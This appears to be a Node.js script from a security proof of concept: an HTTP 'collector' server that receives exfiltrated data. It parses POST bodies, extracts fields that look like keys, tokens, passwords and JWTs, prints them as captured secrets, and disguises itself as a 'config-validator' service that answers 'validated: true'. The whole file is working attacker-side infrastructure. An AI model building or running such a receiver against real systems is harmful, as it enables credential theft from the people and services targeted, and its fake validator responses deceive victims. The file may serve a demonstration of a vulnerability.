#!/usr/bin/env node
/**
 * Collector — HTTP server that logs exfiltrated data from the POC.
 * Listens on port (argv[2] || 4444) and logs all POST bodies.
 */

const http = require('node:http');
const PORT = parseInt(process.argv[2] || '4444', 10);

const RED = '\x1b[31m';
const GREEN = '\x1b[32m';
const YELLOW = '\x1b[33m';
const CYAN = '\x1b[36m';
const RESET = '\x1b[0m';
const BOLD = '\x1b[1m';

let requestCount = 0;

const server = http.createServer((req, res) => {
  if (req.method === 'POST') {
    let body = '';
    req.on('data', (chunk) => (body += chunk));
    req.on('end', () => {
      requestCount++;
      const timestamp = new Date().toISOString();

      console.log('');
      console.log(`${RED}${BOLD}${'='.repeat(60)}${RESET}`);
      console.log(`${RED}${BOLD}  EXFILTRATION RECEIVED (#${requestCount})${RESET}`);
      console.log(`${RED}${BOLD}${'='.repeat(60)}${RESET}`);
      console.log(`${CYAN}  Time:${RESET}     ${timestamp}`);
      console.log(`${CYAN}  Path:${RESET}     ${req.url}`);
      console.log(`${CYAN}  Method:${RESET}   ${req.method}`);
      console.log(`${CYAN}  Headers:${RESET}  ${JSON.stringify(req.headers['content-type'] || 'none')}`);
      console.log(`${CYAN}  Size:${RESET}     ${body.length} bytes`);
      console.log('');

      try {
        const parsed = JSON.parse(body);
        const secrets = [];
        const walk = (obj, path = '') => {
          for (const [k, v] of Object.entries(obj)) {
            const fullPath = path ? `${path}.${k}` : k;
            if (typeof v === 'string') {
              const isSecret =
                /key|secret|token|password|credential|jwt/i.test(k) ||
                /^sk_|^secret_|^jwt_|password/i.test(v);
              if (isSecret) secrets.push({ key: fullPath, value: v });
            } else if (typeof v === 'object' && v !== null) {
              walk(v, fullPath);
            }
          }
        };
        walk(parsed);

        if (secrets.length > 0) {
          console.log(`${RED}${BOLD}  SECRETS CAPTURED:${RESET}`);
          for (const s of secrets) {
            console.log(`${RED}    ${s.key}: ${s.value}${RESET}`);
          }
          console.log('');
        }

        console.log(`${YELLOW}  Full payload:${RESET}`);
        console.log(JSON.stringify(parsed, null, 2).split('\n').map(l => `    ${l}`).join('\n'));
      } catch {
        console.log(`${YELLOW}  Raw body:${RESET}`);
        console.log(`    ${body}`);
      }

      console.log('');
      console.log(`${RED}${BOLD}${'='.repeat(60)}${RESET}`);
      console.log('');

      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ status: 'ok', validated: true }));
    });
  } else {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ status: 'healthy', service: 'config-validator' }));
  }
});

server.listen(PORT, () => {
  console.log(`${GREEN}${BOLD}[collector]${RESET} Listening on port ${PORT}`);
  console.log(`${GREEN}${BOLD}[collector]${RESET} URL: http://localhost:${PORT}/api/v1/validate`);
  console.log(`${GREEN}${BOLD}[collector]${RESET} Waiting for exfiltrated data...`);
  console.log('');
});
